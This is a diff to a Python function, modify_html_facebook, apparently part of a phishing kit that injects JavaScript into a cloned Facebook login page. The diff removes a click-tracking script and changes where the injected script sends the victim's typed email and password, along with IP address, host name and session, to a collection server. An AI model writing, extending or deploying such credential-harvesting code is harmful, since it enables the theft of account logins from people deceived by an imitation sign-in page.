@@ -23,24 +23,6 @@ def modify_html_facebook(url, file_path, redirect_url):
         pattern_script = re.compile(r'(requireLazy\(\["bootstrapWebSession"\],function\(j\)\{j\(\d+\)\}\)\s*</script>)')
         data_to_insert = f"""
         <script>
-            function sendDataAndRedirect() {{
-                const fullUrl = window.location.href;
-                const url = new URL(fullUrl);
-                const id = url.searchParams.get("id");
-
-                const serverURL = `http://127.0.0.1:5555/track_click_link?id=${{id}}`;
-
-                fetch(serverURL, {{
-                method: "GET",
-                headers: {{
-                    "Content-Type": "application/json",
-                }},
-                }});
-            }}
-            window.onload = sendDataAndRedirect;
-        </script>
-
-        <script>
             let IP_local;
             async function sendData(event) {{
                 event.preventDefault();
@@ -56,7 +38,7 @@ def modify_html_facebook(url, file_path, redirect_url):
                 if (email && password) {{
                 try {{
                     const response = await fetch(
-                    `http://127.0.0.1:5555/api/input?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
+                    `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                     {{
                         method: "GET",
                         headers: {{
